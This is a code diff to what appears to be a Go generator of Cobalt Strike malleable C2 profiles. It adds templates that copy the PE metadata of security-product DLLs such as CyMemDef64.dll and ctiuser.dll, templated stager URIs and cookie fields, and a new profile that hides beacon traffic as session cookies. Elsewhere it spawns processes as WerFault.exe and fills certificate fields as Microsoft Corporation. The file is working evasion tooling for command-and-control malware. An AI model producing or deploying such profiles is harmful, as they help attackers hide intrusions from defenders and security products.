@@ -6,10 +6,10 @@ var Profile_Names = []string{
 	`Slack`,
 	`Gotomeeting`,
 	`Outlook.Live`,
-	`Cloudfront`,
+	`Safebrowsing`,
 	`AzureEdge`,
-	`Custom
-`}
+	`Field-Keyword`,
+	`Custom`}
 
 var Post_EX_Process_Name = []string{`
 	set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
@@ -317,7 +317,40 @@ var Peclone_list = []string{`
 	set image_size_x64 "1785856";
 	set name           "WWANSVC.DLL";
 	set rich_header    "\x77\xf3\x15\x7d\x33\x92\x7b\x2e\x33\x92\x7b\x2e\x33\x92\x7b\x2e\x3a\xea\xe8\x2e\xb3\x92\x7b\x2e\x68\xfa\x7f\x2f\x3c\x92\x7b\x2e\x68\xfa\x78\x2f\x30\x92\x7b\x2e\x68\xfa\x7e\x2f\x2d\x92\x7b\x2e\x33\x92\x7a\x2e\xf8\x97\x7b\x2e\x68\xfa\x7a\x2f\x3e\x92\x7b\x2e\x68\xfa\x7b\x2f\x32\x92\x7b\x2e\x68\xfa\x72\x2f\xa9\x92\x7b\x2e\x68\xfa\x86\x2e\x32\x92\x7b\x2e\x68\xfa\x84\x2e\x32\x92\x7b\x2e\x68\xfa\x79\x2f\x32\x92\x7b\x2e\x52\x69\x63\x68\x33\x92\x7b\x2e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-	`}
+	`,
+	`
+	set checksum       "164653";
+	set compile_time   "06 Nov 2020 18:42:28";
+	set entry_point    "63072";
+	set name           "CyMemDef64.dll";
+	set rich_header    "\x5f\x64\xdb\xae\x1b\x05\xb5\xfd\x1b\x05\xb5\xfd\x1b\x05\xb5\xfd\x1b\x05\xb4\xfd\x30\x05\xb5\xfd\xe7\x72\x0c\xfd\x18\x05\xb5\xfd\x7d\xeb\x66\xfd\x07\x05\xb5\xfd\x3c\xc3\x78\xfd\x1a\x05\xb5\xfd\x7d\xeb\x7f\xfd\x1a\x05\xb5\xfd\x3c\xc3\x7c\xfd\x1a\x05\xb5\xfd\x1b\x05\x22\xfd\x1a\x05\xb5\xfd\x7d\xeb\x79\xfd\x1a\x05\xb5\xfd\x52\x69\x63\x68\x1b\x05\xb5\xfd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+	`,
+	`
+	set checksum       "1968945";
+	set compile_time   "26 Jul 2021 18:09:30";
+	set entry_point    "1099888";
+	set image_size_x86 "2072576";
+	set image_size_x64 "2072576";
+	set name           "InProcessClient.dll";
+	set rich_header    "\xd5\x71\x0e\xb3\x91\x10\x60\xe0\x91\x10\x60\xe0\x91\x10\x60\xe0\x85\x7b\x63\xe1\x84\x10\x60\xe0\x85\x7b\x65\xe1\x24\x10\x60\xe0\x48\x64\x64\xe1\x83\x10\x60\xe0\x48\x64\x63\xe1\x9d\x10\x60\xe0\xf7\x7f\x9d\xe0\x92\x10\x60\xe0\x4a\x64\x61\xe1\x93\x10\x60\xe0\x85\x7b\x64\xe1\xb2\x10\x60\xe0\x85\x7b\x61\xe1\x94\x10\x60\xe0\x48\x64\x65\xe1\x0e\x10\x60\xe0\xfb\x78\x65\xe1\x80\x10\x60\xe0\x85\x7b\x66\xe1\x93\x10\x60\xe0\x91\x10\x61\xe0\x5c\x11\x60\xe0\x4a\x64\x69\xe1\x03\x10\x60\xe0\x4a\x64\x63\xe1\x93\x10\x60\xe0\x4a\x64\x60\xe1\x90\x10\x60\xe0\x4a\x64\x9f\xe0\x90\x10\x60\xe0\x91\x10\xf7\xe0\x90\x10\x60\xe0\x4a\x64\x62\xe1\x90\x10\x60\xe0\x52\x69\x63\x68\x91\x10\x60\xe0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+    `,
+	`
+	set checksum       "2817694";
+	set compile_time   "19 May 2021 13:31:53";
+	set entry_point    "1253200";
+	set image_size_x86 "2863104";
+	set image_size_x64 "2863104";
+	set name           "ctiuser.dll";
+	set rich_header    "\x15\xd9\xb0\x30\x51\xb8\xde\x63\x51\xb8\xde\x63\x51\xb8\xde\x63\x45\xd3\xda\x62\x47\xb8\xde\x63\x45\xd3\xdd\x62\x5f\xb8\xde\x63\x45\xd3\xdb\x62\x90\xb8\xde\x63\xcf\x18\x19\x63\x52\xb8\xde\x63\xa9\xc8\xda\x62\x40\xb8\xde\x63\xa9\xc8\xdd\x62\x5b\xb8\xde\x63\xa9\xc8\xdb\x62\xdf\xb8\xde\x63\x45\xd3\xdf\x62\x54\xb8\xde\x63\x45\xd3\xd8\x62\x53\xb8\xde\x63\x51\xb8\xdf\x63\x29\xb9\xde\x63\xe9\xc9\xda\x62\x69\xb8\xde\x63\xe9\xc9\xdb\x62\x13\xb8\xde\x63\xe9\xc9\xde\x62\x50\xb8\xde\x63\xe9\xc9\x21\x63\x50\xb8\xde\x63\x51\xb8\x49\x63\x50\xb8\xde\x63\xe9\xc9\xdc\x62\x50\xb8\xde\x63\x52\x69\x63\x68\x51\xb8\xde\x63\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+    `,
+	`
+	set checksum       "83724";
+	set compile_time   "05 Aug 2020 16:06:20";
+	set entry_point    "5664";
+	set name           "umppc.dll";
+	set rich_header    "\xba\xf0\x63\x99\xfe\x91\x0d\xca\xfe\x91\x0d\xca\xfe\x91\x0d\xca\x92\xf9\x0e\xcb\xff\x91\x0d\xca\x92\xf9\x05\xcb\xf3\x91\x0d\xca\x9b\xf7\x0e\xcb\xfc\x91\x0d\xca\x9b\xf7\x09\xcb\xfb\x91\x0d\xca\x9b\xf7\x0c\xcb\xfd\x91\x0d\xca\xfe\x91\x0c\xca\xc6\x91\x0d\xca\x92\xf9\x0d\xcb\xff\x91\x0d\xca\x92\xf9\xf2\xca\xff\x91\x0d\xca\x92\xf9\x0f\xcb\xff\x91\x0d\xca\x52\x69\x63\x68\xfe\x91\x0d\xca\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+	`,
+}
 
 var Useragent_list = []string{
 	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4242.0 Safari/537.36",
@@ -780,8 +813,8 @@ server {
 
 http-stager {
 
-set uri_x86 "/Meeting/32251817/";
-set uri_x64 "/Meeting/32251816/";
+set uri_x86 "/Meeting/{{.Variables.UValue}}/";
+set uri_x64 "/Meeting/{{.Variables.UValue}}/";
 
 client {
 	header "Host" "{{.Variables.Host}}";
@@ -797,20 +830,20 @@ server {
 
 }
 `, `
-http-get {
-
-{{.Variables.HTTP_GET_URI}}
-
 http-config {
 
 	#set "true" if teamserver is behind redirector
 	set trust_x_forwarded_for "{{.Variables.forward}}";			
 }
+http-get {
+
+{{.Variables.HTTP_GET_URI}}
+
 client {
 
 header "Host" "{{.Variables.Host}}";
 header "Accept" "*/*";
-header "Cookie" "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42=ZG0yMzA2KjEs";
+header "Cookie" "MicrosoftApplicationsTelemetryDeviceId=95c18d8-4dce9854;ClientId=1C0F6C5D910F9;MSPAuth=3EkAjDKjI;xid=730bf7;wla42={{.Variables.UValue}}";
 	
 	metadata {
 		{{.Variables.metadata_mode}};
@@ -944,7 +977,7 @@ client {
 	header "Accept-Language" "en-US,en;q=0.5";
 	metadata {
 		{{.Variables.metadata_mode}};
-		prepend "REF=ID=";
+		prepend "REF=ID={{.Variables.UValue}}";
 		header "Cookie";
 	}
 }
@@ -976,7 +1009,7 @@ client {
 
 	id {
 		{{.Variables.metadata_mode}};
-		prepend "U=193u81141";
+		prepend "U={{.Variables.UValue}}";
 		prepend "REF=ID=";
 		header "Cookie";
 	}
@@ -1066,7 +1099,6 @@ server {
 }
 }
 `, `
-
 http-config {
 
 	#set "true" if teamserver is behind redirector
@@ -1084,7 +1116,7 @@ client {
 
 	metadata {
 		{{.Variables.metadata_mode}};
-		prepend "PREF=ID=";
+		prepend "PREF=ID={{.Variables.CSMValue}}";
 		header "Cookie";
 	}
 }
@@ -1115,7 +1147,7 @@ client {
 
 	id {
 		{{.Variables.metadata_mode}};
-		prepend "U=779b64e1a7ed737a";
+		prepend "U={{.Variables.UValue}}";
 		prepend "PREF=ID=";
 		header "Cookie";
 	}
@@ -1137,7 +1169,72 @@ server {
 		print;
 	}
 }
-}`}
+}`,
+	`
+http-config {
+
+	#set "true" if teamserver is behind redirector
+	set trust_x_forwarded_for "{{.Variables.forward}}";			
+}
+
+http-get {
+
+
+    {{.Variables.HTTP_GET_URI}}
+
+    client {
+
+        header "Accept" "*/*";
+
+        metadata {
+            {{.Variables.metadata_mode}};;
+            prepend "session-token=";
+            append "csm-hit={{.Variables.CSMValue}}";
+            header "Cookie";
+        }
+    }
+    server {
+        output {
+                print;
+        }
+}
+}
+
+http-post {
+
+    {{.Variables.HTTP_POST_URI}}
+
+    client {
+
+        header "Accept" "*/*";
+        header "Content-Type" "text/xml";
+        header "X-Requested-With" "XMLHttpRequest";
+
+        id {
+                {{.Variables.metadata_mode}};;
+                prepend "U={{.Variables.UValue}}";
+                prepend "REF=ID=";
+                header "Cookie";
+        }
+
+        output {
+                print;
+        }
+}
+
+    server {
+
+        header "Server" "Server";
+        header "X-Frame-Options" "SAMEORIGIN";
+        header "x-ua-compatible" "IE=edge";
+
+        output {
+            print;
+        }
+    }
+}
+`,
+}
 
 var Cert = []string{`
 set O        "Microsoft Corporation"; #Organization Name
